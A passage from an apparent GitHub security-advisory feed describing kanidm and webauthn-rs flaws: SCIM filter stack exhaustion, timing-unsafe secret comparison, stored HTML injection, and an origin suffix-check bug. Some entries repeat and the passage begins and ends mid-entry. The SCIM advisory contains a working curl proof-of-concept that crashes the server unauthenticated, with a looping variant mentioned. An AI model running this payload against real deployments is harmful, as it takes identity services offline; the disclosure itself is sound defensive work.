<p>The production daemon (<code>server/daemon/src/main.rs:735-744</code>) uses <code>new_multi_thread()</code> with default 2 MiB worker stacks; hyper's <code>max_buf_size</code> (~400 KiB) is not lowered (<code>server/core/src/https/mod.rs:708-727</code>), so a 12 KB URI is accepted.</p>
<p>An identical unbounded grammar exists in <code>libs/scim_proto/src/filter.rs:112-276</code> (not network-reachable, but should be fixed in the same patch).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">curl -sk "https://idm.example.com/scim/v1/Application?filter=$(python3 -c 'print("("*3000+"a+pr"+")"*3000)')"
# → curl: (52) Empty reply from server
# → server journal: "fatal runtime error: stack overflow, aborting", SIGABRT
</code></pre>
<p>Release-build threshold measured at ~2 000 nesting levels / ~4 KB:</p>
<pre><code>$ cargo test --release -p kanidm_proto --test scim_filter_depth -- --nocapture
parens depth=1500 len=3004
  -&gt; survived
parens depth=2000 len=4004

thread 'audit_scim_filter_nested_parens' has overflowed its stack
fatal runtime error: stack overflow, aborting
  (signal: 6, SIGABRT: process abort signal)
</code></pre>
<p>End-to-end against an in-process server via <code>kanidmd_testkit</code> (no authentication performed):</p>
<pre><code>Testkit server setup complete - http://localhost:18080/
audit_scim_dos: sending unauthenticated GET, url len = 12056

thread '...' has overflowed its stack
fatal runtime error: stack overflow, aborting
  (signal: 6, SIGABRT: process abort signal)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Process-wide availability loss; no confidentiality or integrity impact.</p>
<ul>
<li><strong>Unauthenticated</strong>, default install, no feature flag required.</li>
<li><strong>Process abort, not task panic.</strong> Stack overflow triggers libstd's guard-page handler, which calls <code>std::process::abort()</code>. tokio's per-task <code>catch_unwind</code> isolation does not apply to aborts. All in-flight HTTP requests, OAuth2/OIDC sessions, LDAP binds, and the web UI are terminated.</li>
<li><strong>Repeatable.</strong> One ~12 KB GET per crash; a <code>while true; do curl ...; done</code> loop holds the service down indefinitely across supervisor restarts.</li>
<li>The 6 011-byte variant (<code>depth=3000</code>) fits under the nginx default <code>large_client_header_buffers</code> limit of 8 KB, so a typical reverse proxy does not mitigate.</li>
</ul>
<p><strong>Affected</strong>: v1.7.0 through <code>master</code> @ edf50b9da.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/kanidm/security/advisories/GHSA-r5fr-9gmv-jggh">https://github.com/kanidm/kanidm/security/advisories/GHSA-r5fr-9gmv-jggh</a></li>
<li><a href="https://github.com/advisories/GHSA-r5fr-9gmv-jggh">https://github.com/advisories/GHSA-r5fr-9gmv-jggh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5fr-9gmv-jggh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T23:38:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scim_proto] scim_proton and kanidm_proto have an authenticated process abort via SCIM filter stack exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-r5fr-9gmv-jggh</id>
        <link href="https://github.com/advisories/GHSA-r5fr-9gmv-jggh"/>
        <updated>2026-05-06T23:38:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A single unauthenticated <code>GET</code> to any <code>/scim/v1/...</code> endpoint with a <code>?filter=</code> query string of a few thousand nested parentheses (≈ 4–12 KB) drives the recursive-descent PEG parser past the worker thread's stack guard page. Rust responds to stack overflow with <code>std::process::abort()</code> — the entire <code>kanidmd</code> process exits. The parse runs inside axum's <code>Query&lt;ScimEntryGetQuery&gt;</code> extractor, before any handler body and therefore before any ACL check.</p>
<h3 id="details">Details</h3>
<p>The SCIM filter grammar recurses on <code>(</code> and <code>not (</code> with no depth bound.</p>
<p><strong><code>proto/src/scim_v1/mod.rs:263-433</code></strong> — <code>peg::parser! { grammar scimfilter() ... }</code>:</p>
<pre><code class="language-rust">// line 281
"not" separator()+ "(" e:parse() ")" { ScimFilter::Not(Box::new(e)) }
// line 293
"(" e:parse() ")" { e }
</code></pre>
<p>Both rules re-enter <code>parse()</code> without a depth counter.</p>
<p><strong><code>proto/src/scim_v1/mod.rs:442-447</code></strong> — <code>impl FromStr for ScimFilter</code> calls <code>scimfilter::parse(input)</code> directly on the raw string with no length or depth pre-check.</p>
<p><strong><code>proto/src/scim_v1/mod.rs:80-81</code></strong> — <code>ScimEntryGetQuery.filter</code> is <code>#[serde_as(as = "Option&lt;DisplayFromStr&gt;")]</code>, so deserialising the query struct invokes <code>ScimFilter::from_str</code> on attacker bytes.</p>
<p><strong>Unauthenticated reachability</strong> — nine handlers in <code>server/core/src/https/v1_scim.rs</code> (route table at lines 865-1029) take <code>Query&lt;ScimEntryGetQuery&gt;</code> as an argument: <code>/scim/v1/Entry</code>, <code>/scim/v1/Entry/{id}</code>, <code>/scim/v1/Person/{id}</code>, <code>/scim/v1/Application</code>, <code>/scim/v1/Application/{id}</code>, <code>/scim/v1/Class</code>, <code>/scim/v1/Attribute</code>, <code>/scim/v1/Message</code>, <code>/scim/v1/Message/{id}</code>. The SCIM router is merged unconditionally for every server role (<code>server/core/src/https/mod.rs:312</code>).</p>
<p>Axum extracts handler arguments before the handler body runs. The preceding <code>VerifiedClientInformation</code> extractor (<code>server/core/src/https/extractors/mod.rs:16-91</code>) always returns <code>Ok</code> (line 89) regardless of credentials; authorization is deferred to the handler body, which is never reached.</p>
<p>The existing semantic depth limit (<code>DEFAULT_LIMIT_FILTER_DEPTH_MAX = 12</code>, <code>server/lib/src/constants/mod.rs:212</code>) is enforced in <code>Filter::from_scim_ro</code> (<code>server/lib/src/filter.rs:786</code>) <strong>after</strong> the PEG parse has already produced an AST, so it cannot prevent the parser itself from blowing the stack.</p>
<p>The production daemon (<code>server/daemon/src/main.rs:735-744</code>) uses <code>new_multi_thread()</code> with default 2 MiB worker stacks; hyper's <code>max_buf_size</code> (~400 KiB) is not lowered (<code>server/core/src/https/mod.rs:708-727</code>), so a 12 KB URI is accepted.</p>
<p>An identical unbounded grammar exists in <code>libs/scim_proto/src/filter.rs:112-276</code> (not network-reachable, but should be fixed in the same patch).</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">curl -sk "https://idm.example.com/scim/v1/Application?filter=$(python3 -c 'print("("*3000+"a+pr"+")"*3000)')"
# → curl: (52) Empty reply from server
# → server journal: "fatal runtime error: stack overflow, aborting", SIGABRT
</code></pre>
<p>Release-build threshold measured at ~2 000 nesting levels / ~4 KB:</p>
<pre><code>$ cargo test --release -p kanidm_proto --test scim_filter_depth -- --nocapture
parens depth=1500 len=3004
  -&gt; survived
parens depth=2000 len=4004

thread 'audit_scim_filter_nested_parens' has overflowed its stack
fatal runtime error: stack overflow, aborting
  (signal: 6, SIGABRT: process abort signal)
</code></pre>
<p>End-to-end against an in-process server via <code>kanidmd_testkit</code> (no authentication performed):</p>
<pre><code>Testkit server setup complete - http://localhost:18080/
audit_scim_dos: sending unauthenticated GET, url len = 12056

thread '...' has overflowed its stack
fatal runtime error: stack overflow, aborting
  (signal: 6, SIGABRT: process abort signal)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Process-wide availability loss; no confidentiality or integrity impact.</p>
<ul>
<li><strong>Unauthenticated</strong>, default install, no feature flag required.</li>
<li><strong>Process abort, not task panic.</strong> Stack overflow triggers libstd's guard-page handler, which calls <code>std::process::abort()</code>. tokio's per-task <code>catch_unwind</code> isolation does not apply to aborts. All in-flight HTTP requests, OAuth2/OIDC sessions, LDAP binds, and the web UI are terminated.</li>
<li><strong>Repeatable.</strong> One ~12 KB GET per crash; a <code>while true; do curl ...; done</code> loop holds the service down indefinitely across supervisor restarts.</li>
<li>The 6 011-byte variant (<code>depth=3000</code>) fits under the nginx default <code>large_client_header_buffers</code> limit of 8 KB, so a typical reverse proxy does not mitigate.</li>
</ul>
<p><strong>Affected</strong>: v1.7.0 through <code>master</code> @ edf50b9da.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/kanidm/security/advisories/GHSA-r5fr-9gmv-jggh">https://github.com/kanidm/kanidm/security/advisories/GHSA-r5fr-9gmv-jggh</a></li>
<li><a href="https://github.com/advisories/GHSA-r5fr-9gmv-jggh">https://github.com/advisories/GHSA-r5fr-9gmv-jggh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5fr-9gmv-jggh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T23:38:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kanidm] Kanidm has non-constant-time comparison of OAuth2 client_secret]]></title>
        <id>https://github.com/advisories/GHSA-53hj-r94p-8c8f</id>
        <link href="https://github.com/advisories/GHSA-53hj-r94p-8c8f"/>
        <updated>2026-05-06T23:37:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The kanidmd OAuth2 token-exchange (<code>/oauth2/token</code>) and token-introspection (<code>/oauth2/token/introspect</code>) endpoints compare the supplied <code>client_secret</code> against the stored secret using Rust's <code>PartialEq</code> on <code>String</code>, which short-circuits on the first mismatching byte. This produces an observable timing discrepancy that varies with the length of the matching prefix.</p>
<h3 id="details">Details</h3>
<ul>
<li><a href="https://github.com/kanidm/kanidm/blob/master/server/lib/src/idm/oauth2.rs#L1135">https://github.com/kanidm/kanidm/blob/master/server/lib/src/idm/oauth2.rs#L1135</a> — variable-time comparison in <code>check_oauth2_token_exchange</code></li>
<li><a href="https://cwe.mitre.org/data/definitions/208.html">https://cwe.mitre.org/data/definitions/208.html</a> — CWE-208: Observable Timing Discrepancy</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Static analysis only — no timing-recovery script was run because remote recovery of a 48-byte high-entropy secret over HTTPS is not practically demonstrable. The variable-time behaviour is established by inspection:</p>
<pre><code class="language-rust">// server/lib/src/idm/oauth2.rs:1135  (check_oauth2_token_exchange)
if authz_secret == &amp;secret { … } else { return Err(Oauth2Error::AuthenticationRequired); }
</code></pre>
<p><code>String: PartialEq</code> delegates to <code>&lt;[u8] as PartialEq&gt;::eq</code>, which checks length equality then iterates byte-by-byte and returns on the first difference.</p>
<h3 id="impact">Impact</h3>
<p>An unauthenticated network attacker who can reach the OAuth2 endpoints can submit arbitrary <code>client_id</code>/<code>client_secret</code> pairs and observe response latency. In principle the early-exit comparison leaks the position of the first mismatching byte, providing a timing oracle toward incremental recovery of a confidential client's secret. In practice the stored secret is a server-generated 48-character high-entropy string, the comparison runs inside an async tokio handler behind TLS, and network jitter is orders of magnitude larger than a single byte-compare — so remote recovery is not considered realistic with current techniques. This is a hardening issue rather than a practically exploitable vulnerability.</p>
<h3 id="affected-versions">Affected versions</h3>
<p>All published <code>kanidmd_lib</code> releases; the comparison is still variable-time on <code>master</code> at 1.10.0-dev</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/kanidm/security/advisories/GHSA-53hj-r94p-8c8f">https://github.com/kanidm/kanidm/security/advisories/GHSA-53hj-r94p-8c8f</a></li>
<li><a href="https://github.com/advisories/GHSA-53hj-r94p-8c8f">https://github.com/advisories/GHSA-53hj-r94p-8c8f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-53hj-r94p-8c8f</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T23:37:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kanidm] Kanidm: Stored HTML injection in "passkey-enrolment" partial via displayname → htmx-driven authenticated request forgery]]></title>
        <id>https://github.com/advisories/GHSA-gpxg-fx2g-qxj2</id>
        <link href="https://github.com/advisories/GHSA-gpxg-fx2g-qxj2"/>
        <updated>2026-05-06T23:34:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The kanidmd web UI renders the WebAuthn passkey-registration challenge as raw JSON inside an inline <code>&lt;script id="data"&gt;</code> element using the Askama <code>|safe</code> filter. The challenge embeds the account's <code>displayname</code>, which <code>serde_json</code> serialises without escaping <code>&lt;</code>/<code>&gt;</code>. A <code>displayname</code> containing <code>&lt;/script&gt;</code> therefore terminates the script element early and injects arbitrary HTML into the credential-update page. Because the page is htmx-driven and the server's CSP allows <code>'unsafe-eval'</code>, injected <code>hx-*</code> attributes can issue authenticated same-origin API requests with the viewer's bearer cookie.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker who is a member of <code>idm_people_admins</code> can write the <code>displayname</code> of any <code>Person</code> entry — including high-privilege persons — because <code>idm_acp_people_pii_manage</code> carries no high-privilege exclusion filter. When the targeted high-privilege user later opens <strong>Add Passkey</strong> on their own credential-update page (<code>/ui/reset</code>), the injected markup is swapped into the DOM and htmx fires attacker-chosen same-origin requests authenticated as the victim. This allows a helpdesk-tier operator to escalate to <code>idm_admins</code> (e.g. by POSTing themselves into the group) or otherwise act with the victim's session. The self-write path (<code>idm_people_self_name_write</code>) is self-XSS only and is not counted toward impact. Even without the htmx vector, the breakout permits <code>&lt;meta http-equiv='refresh'&gt;</code> open-redirect and arbitrary defacement of the credential page.</p>
<h3 id="details">Details</h3>
<ul>
<li><a href="https://github.com/kanidm/kanidm/blob/master/server/core/templates/credential_update_add_passkey_partial.html#L3">https://github.com/kanidm/kanidm/blob/master/server/core/templates/credential_update_add_passkey_partial.html#L3</a> — the <code>|safe</code> sink</li>
<li><a href="https://github.com/kanidm/kanidm/blob/master/server/core/src/https/views/reset.rs#L506-L509">https://github.com/kanidm/kanidm/blob/master/server/core/src/https/views/reset.rs#L506-L509</a> — <code>serde_json::to_string</code> of the challenge</li>
<li><a href="https://github.com/kanidm/kanidm/blob/master/server/lib/src/idm/credupdatesession.rs#L2453-L2460">https://github.com/kanidm/kanidm/blob/master/server/lib/src/idm/credupdatesession.rs#L2453-L2460</a> — <code>displayname</code> flows into <code>start_passkey_registration</code></li>
</ul>
<h3 id="affected-versions">Affected versions</h3>
<p>All releases shipping the htmx credential-update views</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/kanidm/security/advisories/GHSA-gpxg-fx2g-qxj2">https://github.com/kanidm/kanidm/security/advisories/GHSA-gpxg-fx2g-qxj2</a></li>
<li><a href="https://github.com/advisories/GHSA-gpxg-fx2g-qxj2">https://github.com/advisories/GHSA-gpxg-fx2g-qxj2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gpxg-fx2g-qxj2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T23:34:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webauthn-authenticator-rs] webauthn-rs-core/webauthn-authenticator-rs: Origin validation mismatch possible when subdomains are allowed]]></title>
        <id>https://github.com/advisories/GHSA-22w3-693w-x895</id>
        <link href="https://github.com/advisories/GHSA-22w3-693w-x895"/>
        <updated>2026-05-06T23:31:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>webauthn-rs-core</code> (<a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>) and <code>webauthn-authenticator-rs</code> (<a href="https://www.w3.org/TR/webauthn-3/#client">client</a>) checked that <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">an <code>Origin</code> in <code>CollectedClientData</code></a> is valid for <a href="https://www.w3.org/TR/webauthn-3/#rp-id">an RP ID</a> with <a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a>, <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">without checking for a dot (<code>.</code>) before the RP ID when allowing subdomains</a>.</p>
<p>This check is flawed, and could allow requests from an attacker-controlled domain such as <code>hermit-crab.example</code> to be accepted for the RP ID <code>crab.example</code> (assuming <code>.example</code> was publicly-registerable TLD) when the RP allows authenticating from a subdomain (disabled by default in <code>webauthn-rs-core</code> and <code>webauthn-rs</code>).</p>
<ul>
<li><p>In <code>webauthn-rs-core</code>, this <strong>only</strong> applies when:</p>
<ul>
<li><a href="https://docs.rs/webauthn-rs-core/0.5.4/webauthn_rs_core/struct.WebauthnCore.html#method.new_unsafe_experts_only"><code>WebauthnCore::allow_subdomains_origin</code></a> is <code>true</code> (the default is <code>false</code>), <em>and</em></li>
<li>the attacker could register a domain that ends with the RP ID as a raw string, <em>and</em>,</li>
<li>the client does not implement these checks correctly either</li>
</ul>
<p><code>webauthn-rs</code> can set <code>allow_subdomains_origin</code> via <a href="https://docs.rs/webauthn-rs/0.5.4/webauthn_rs/struct.WebauthnBuilder.html#method.allow_subdomains"><code>WebauthnBuilder::allow_subdomains</code></a>. Fixing the bug in <code>webauthn-rs-core</code> also fixes it in <code>webauthn-rs</code>.</p>
</li>
<li><p>In <code>webauthn-authenticator-rs</code>, the flawed check is in <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>WebauthnAuthenticator::do_registration()</code></a> and <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>do_authentication()</code></a>. </p>
<p>A conforming <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> implementation would reject such requests, but <code>webauthn-rs-core</code> did not.</p>
<p>An application can still provide an incorrect <code>origin</code> parameter to <code>webauthn-authenticator-rs</code>, or use lower-level APIs that bypass these checks entirely, and this is by design.</p>
</li>
</ul>
<p>These issues are a violation of <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn Level 3 §13.4.9</a>, <a href="https://www.w3.org/TR/webauthn-3/#CreateCred-DetermineRpId">§5.1.3 Step 8</a> and <a href="https://www.w3.org/TR/webauthn-3/#GetAssn-DetermineRpId">§5.1.4.1 Step 7</a>.</p>
<h3 id="details">Details</h3>
<ul>
<li><p><code>webauthn-rs-core/src/core.rs</code> line 1213:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 274:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 335:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338</a></p>
</li>
</ul>
<p><a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a> performs a raw string suffix match <em>without</em> <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">enforcing a domain label boundary</a>:</p>
<table>
<thead>
<tr>
<th>Origin</th>
<th>RP ID</th>
<th>Expected result</th>
<th>Result with incorrect <code>ends_with</code> check</th>
</tr>
</thead>
<tbody><tr>
<td><code>hermit-crab.example</code></td>
<td><code>crab.example</code></td>
<td>rejected</td>
<td>accepted <strong>(bug!)</strong></td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (subdomain)</td>
</tr>
<tr>
<td><code>crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
<tr>
<td><code>hermit-crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>rejected</td>
<td>rejected</td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
</tbody></table>
<h3 id="fix">Fix</h3>
<p>When <code>webauthn-rs-core</code> v0.5.5 checks if an <code>Origin</code> is a valid subdomain of an RP ID, it will check that it ends with the RP ID prefixed with a dot (<code>.{rp_id}</code>). <code>webauthn-rs</code> v0.5.5 will be fixed by depending on <code>webauthn-rs-core</code> v0.5.5.</p>
<p><code>webauthn-authenticator-rs</code> v0.5.5 now uses <code>webauthn-rs-core</code>'s checks in <code>WebauthnAuthenticator</code>.</p>
<p>Regression tests for this bug have been added to both libraries.</p>
<h3 id="impact">Impact</h3>
<p>With a <strong>both</strong> a non-conforming <a href="https://www.w3.org/TR/webauthn-3/#client">client</a> implementation and vulnerable version of <code>webauthn-rs-core</code> configured to allow subdomains (not the default), this bug would allow an attacker at <code>hermit-crab.example</code> to phish a target's credential for the RP ID <code>crab.example</code> by directly proxying a legitimate <code>navigator.credentials.get()</code> request on the attacker's domain.</p>
<p>However, <em>conforming</em> <a href="https://www.w3.org/TR/webauthn-3/#client">client implementations</a> (ie: all web browsers) will refuse to process WebAuthn requests for an RP ID that does not match the <code>Origin</code> of the current page and is not <a href="https://www.w3.org/TR/webauthn-3/#sctn-related-origins">a related <code>Origin</code></a>.</p>
<p>In the scenario above with <em>conforming</em> client-side checks, this would force the attacker to change the request's RP ID to <code>hermit-crab.example</code> (the attacker's <code>Origin</code>). This would also change the RP ID hash, <a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L825-L840">and <code>webauthn-rs-core</code> would reject it</a> (per <a href="https://www.w3.org/TR/webauthn-3/#rp-op-verifying-assertion-step-rpid-hash">WebAuthn §7.2 Step 15</a>).</p>
<h3 id="severity">Severity</h3>
<p>Per <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn §13.4.9</a>:</p>
<blockquote>
<p>The <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> MUST NOT accept unexpected values of <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">origin</a>, as doing so could allow a malicious website to obtain valid <a href="https://www.w3.org/TR/credential-management-1/#concept-credential">credentials</a>. Although the <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a> of WebAuthn credentials prevents their use on domains outside the <a href="https://www.w3.org/TR/webauthn-3/#rp-id">RP ID</a> they were registered for, the <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>’s origin validation serves as an additional layer of protection in case a faulty <a href="https://www.w3.org/TR/webauthn-3/#authenticator">authenticator</a> fails to enforce credential <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a>.</p>
</blockquote>
<p>Unfortunately, <a href="https://www.first.org/cvss/v4.0/user-guide#Vulnerability-Chaining">the chain needed to exploit this bug makes it difficult to classify with the CVSS framework</a>. Kanidm came up with anywhere between "low" and "high" depending on the approach, and GitHub only provides one CVSS field for everything.</p>
<p>An attacker could easily bypass a <em>correctly-implemented</em> server-side <code>Origin</code> check, if they can convince a target to use their authenticator with <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.2">an attacker-controlled client device</a> or <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.1">buggy/malicious client application</a>. FIDO's Security Reference <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-sa-4">assumes that "the FIDO user device and applications involved in a FIDO operation are trustworthy agents of the user"</a>, and violating that <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#discussion">limits the protections FIDO can provide</a>, so it would be ridiculous to describe those bypasses as a "high" severity vulnerability.</p>
<p>However, <code>webauthn-rs-core</code> should take reasonable steps to prevent these sorts of issues where it can, especially when they're part of the WebAuthn specification.</p>
<p>Due to the complex preconditions and non-default configuration required to execute a successful attack, and that it is <em>not exploitable</em> in popular web browsers, Kanidm considers this a <strong>low severity</strong> issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895">https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895</a></li>
<li><a href="https://github.com/advisories/GHSA-22w3-693w-x895">https://github.com/advisories/GHSA-22w3-693w-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22w3-693w-x895</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T23:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webauthn-rs-core] webauthn-rs-core/webauthn-authenticator-rs: Origin validation mismatch possible when subdomains are allowed]]></title>
        <id>https://github.com/advisories/GHSA-22w3-693w-x895</id>
        <link href="https://github.com/advisories/GHSA-22w3-693w-x895"/>
        <updated>2026-05-06T23:31:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>webauthn-rs-core</code> (<a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>) and <code>webauthn-authenticator-rs</code> (<a href="https://www.w3.org/TR/webauthn-3/#client">client</a>) checked that <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">an <code>Origin</code> in <code>CollectedClientData</code></a> is valid for <a href="https://www.w3.org/TR/webauthn-3/#rp-id">an RP ID</a> with <a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a>, <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">without checking for a dot (<code>.</code>) before the RP ID when allowing subdomains</a>.</p>
<p>This check is flawed, and could allow requests from an attacker-controlled domain such as <code>hermit-crab.example</code> to be accepted for the RP ID <code>crab.example</code> (assuming <code>.example</code> was publicly-registerable TLD) when the RP allows authenticating from a subdomain (disabled by default in <code>webauthn-rs-core</code> and <code>webauthn-rs</code>).</p>
<ul>
<li><p>In <code>webauthn-rs-core</code>, this <strong>only</strong> applies when:</p>
<ul>
<li><a href="https://docs.rs/webauthn-rs-core/0.5.4/webauthn_rs_core/struct.WebauthnCore.html#method.new_unsafe_experts_only"><code>WebauthnCore::allow_subdomains_origin</code></a> is <code>true</code> (the default is <code>false</code>), <em>and</em></li>
<li>the attacker could register a domain that ends with the RP ID as a raw string, <em>and</em>,</li>
<li>the client does not implement these checks correctly either</li>
</ul>
<p><code>webauthn-rs</code> can set <code>allow_subdomains_origin</code> via <a href="https://docs.rs/webauthn-rs/0.5.4/webauthn_rs/struct.WebauthnBuilder.html#method.allow_subdomains"><code>WebauthnBuilder::allow_subdomains</code></a>. Fixing the bug in <code>webauthn-rs-core</code> also fixes it in <code>webauthn-rs</code>.</p>
</li>
<li><p>In <code>webauthn-authenticator-rs</code>, the flawed check is in <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>WebauthnAuthenticator::do_registration()</code></a> and <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>do_authentication()</code></a>. </p>
<p>A conforming <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> implementation would reject such requests, but <code>webauthn-rs-core</code> did not.</p>
<p>An application can still provide an incorrect <code>origin</code> parameter to <code>webauthn-authenticator-rs</code>, or use lower-level APIs that bypass these checks entirely, and this is by design.</p>
</li>
</ul>
<p>These issues are a violation of <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn Level 3 §13.4.9</a>, <a href="https://www.w3.org/TR/webauthn-3/#CreateCred-DetermineRpId">§5.1.3 Step 8</a> and <a href="https://www.w3.org/TR/webauthn-3/#GetAssn-DetermineRpId">§5.1.4.1 Step 7</a>.</p>
<h3 id="details">Details</h3>
<ul>
<li><p><code>webauthn-rs-core/src/core.rs</code> line 1213:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 274:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 335:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338</a></p>
</li>
</ul>
